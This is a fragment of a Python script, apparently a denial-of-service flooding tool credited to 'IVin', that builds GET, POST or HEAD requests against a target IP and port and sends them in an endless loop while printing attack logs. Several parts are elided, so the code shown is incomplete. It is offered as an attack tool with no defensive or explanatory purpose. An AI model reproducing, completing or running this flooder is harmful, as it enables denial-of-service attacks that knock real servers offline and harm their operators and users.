...
import sys
os.system("color 5")
os.system(f"title V2 Made By IVin")
kevin = "New"
...
os.system("cls")
print("[V2] Credit: ICiroNV,AiTroGanz [V2]")
print("|=====================================|")
...
def run():
    ...
    if method_attack == "1":
        get_host = "GET /Attack From Refano Rosnata Putra|Tingkatin lagi/1.1\r\nServer " + ip + "\r\n"
        request  = get_host + header + "\r\n"
    else:
        get_host = random.choice(['GET','POST','HEAD']) + " /Get Attack From Refano Rosnata Putra|Tingkatin lagi/1.1\r\nServer " + ip + "\r\n"
        request  = get_host + header + "\r\n"
    while True:
        try:
            ...
            s.close()
            print("[V2] Attack LOGS",ip,":",port,"[V2]")
